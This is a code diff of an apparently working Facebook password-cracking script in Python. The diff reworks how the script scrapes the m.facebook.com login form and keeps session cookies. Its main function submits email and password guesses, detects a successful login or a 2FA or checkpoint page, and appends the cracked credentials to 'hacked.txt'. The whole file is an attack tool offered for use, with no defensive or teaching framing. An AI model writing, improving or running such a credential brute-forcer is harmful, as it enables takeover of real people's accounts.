@@ -1,8 +1,7 @@
 #coding: utf-8
 import os.path
-import requests,json,re
+import requests,json,bs4
 import sys,os,time
-session=requests.Session()
 logo=""" \033[1;92m███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗
 ██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝
 █████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║█████╔╝
@@ -19,59 +18,118 @@ if sys.version_info[0] != 3:
   sys.exit()
 len_pass=0
 MIN_PASSWORD_LENGTH = 6
-POST_URL = 'https://m.facebook.com/login.php'
-HEADERS={'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'}
-BODY = {}
-COOKIES = {}
 ## ang pag gaya sa code na ito ay hindi magiging dahilan para tawaging kang coder bigyan moko ng credit sa pag gaya mo at matutuwa pako
 ## copying this code will not be a reason to call you a coder give me credit for copying and I'll be happy
-def create_form():
-    form = dict()
-    cookies = dict()
-    while True:
-      try:
-        data = session.get(POST_URL, headers=HEADERS)
-        for cookie in data.cookies:
-          cookies[cookie.name]=cookie.value
-        action_url= re.findall(r'method="post" action="(.*?)"',data.text).pop(0)
-        value=re.findall(r'value="(.*?)"',data.text)
-        form['lsd']=value[0]
-        form['jazoest']=value[1]
-        form['m_ts']=value[2]
-        form['li']=value[3]
-        form['try_number']=value[4]
-        form['unrecognized_tries']=value[5]
-        form['login']=value[6]
-        form['bi_xrwh']=value[10]
-        return form, cookies, action_url
-      except:
+def save_cookies(cookies, header):
+    try:
+        os.mkdir("cookies")
+    except OSError:
         pass
+    for i in header.cookies:
+        cookies[i.name]=i.value
+    with open("cookies/cookies.json", "w") as cf:
+        json.dump(cookies, cf)
+    return True
+def clean_cookie():
+    cf = json.loads(open("cookies/cookies.json", "r").read())
+    if "checkpoint" in cf:
+        del cf["checkpoint"]
+    
+    with open("cookies/cookies.json", "w") as cookie:
+        json.dump(cf, cookie)
+    
+    return
+def save_Referer(page):
+    with open("cookies/Referer.txt", "w") as f:
+        f.write(str(page.url))
+        f.close()
+    return True
+def find_input_fields(html):
+    return bs4.BeautifulSoup(html, "html.parser", parse_only=bs4.SoupStrainer("input"))
+def find_url(page):
+    soup = bs4.BeautifulSoup(page, "html.parser")
+    url = soup.find("form").get("action")
+    return (f"https://m.facebook.com:443{url}")
+def open_cookies():
+    try:
+        cf = open("cookies/cookies.json", "r").read()
+        cookies = json.loads(cf)
+    except IOError:
+        cookies = {"fr":"0NFggJSEGI3pYX23U..BjKftf.wx.AAA.0.0.BjKftf.AWUytHdS_8E", "m_pixel_ratio":"3","locale":"en_US"}
+    return cookies
+def open_headers():
+    try:
+      header = {'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'}
+      header['Referer'] = open("cookies/Referer.txt", "r").read()
+    except IOError:
+        header={'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'}
+    return header
+def browser(url, data=None, redirect=True):
+    # cookies
+    cookies = open_cookies()
+    # header
+    header = open_headers()
+    # requests
+    if data == None:
+        #print(f"Browser get method {url}")
+        page = requests.get(url, headers=header, cookies=cookies, allow_redirects=redirect)
+    else:
+        #print(f"Browser post method {url} data = {data}")
+        page = requests.post(url, headers=header, data=data, cookies=cookies, allow_redirects=redirect)
+    #log
+    #print(f"Browser response url {page.url}")
+    #function
+    if save_cookies(cookies, page) and save_Referer(page):
+        return page
+def create_form():
+    URL = 'https://m.facebook.com'
+    page = browser(URL)
+    soup = find_input_fields(page.text)
+    action_url = find_url(page.text)
+    data = dict(
+        (elem["name"], elem["value"])
+        for elem in soup
+        if elem.has_attr("value") and elem.has_attr("name")
+        )
+    data["login"] = "Log in"
+    return data, action_url
 
 
 def na_hack_naba(email,password):
-    global BODY, COOKIES
-    BODY, COOKIES, URL = create_form()
-    BODY['email'] = email
-    BODY['pass'] = password
     while True:
-      try:
-        r = session.post('https://m.facebook.com{}'.format(str(URL)), data=BODY, cookies=COOKIES, headers=HEADERS)
-        if "c_user" in r.cookies or "save-device" in r.url or "home.php" in r.url:
-          open('hacked.txt', 'a').write(str(email+' | '+password))
-          print(65 * '\033[1;92m=')
-          print('\n\033[1;93mPassword found Sir: \033[1;92m'+password+'\n')
-          print(65 * '\033[1;92m=')
-          return True
-        elif "checkpoint" in r.cookies or "checkpoint_title" in r.text or "checkpoint" in r.url:
-          open('hack_but_checkpoint.txt', 'a').write(str(email+' | '+password))
-          print(65 * '\033[1;92m=')
-          print('\n\033[1;93mPassword found but checkpoint: \033[1;92m'+password+'\n')
-          print(65 * '\033[1;92m=')
-          return True
-        else:
-          return False
-      except:
-        pass
+        try:
+            data, url = create_form()
+            data['email'] = email
+            data['pass'] = password
+            page = browser(url, data=data)
+            if "c_user" in page.cookies or "save-device" in page.url or "home.php" in page.url:
+                open('hacked.txt', 'a').write(str(email+' | '+password+'\n'))
+                print(65 * '\033[1;92m=')
+                print('\n\033[1;93mPassword found Sir: \033[1;92m'+password+'\n')
+                print(65 * '\033[1;92m=')
+                os.system("rm -rf cookies")
+                return True
+            elif "checkpoint" in page.url and "approvals_code" in page.text:
+                open('hack_but_checkpoint.txt', 'a').write(str(email+' | '+password+'\n'))
+
+                print(65 * '\033[1;92m=')
+
+                print('\n\033[1;93mPassword found 2FA auth required: \033[1;92m'+password+'\n')
+                print(65 * '\033[1;92m=')
+                os.system("rm -rf cookies")
+                return True
+                
+            elif "checkpoint_title" in page.text or "checkpoint" in page.url:
+                open('hack_but_checkpoint.txt', 'a').write(str(email+' | '+password+'\n'))
+                print(65 * '\033[1;92m=')
+                print('\n\033[1;93mPassword found but checkpoint: \033[1;92m'+password+'\n')
+                print(65 * '\033[1;92m=')
+                os.system("rm -rf cookies")
+                return True
+            else:
+                return False
+        except:
+            pass
 if __name__ == "__main__":
   os.system('reset')
   os.system('clear')
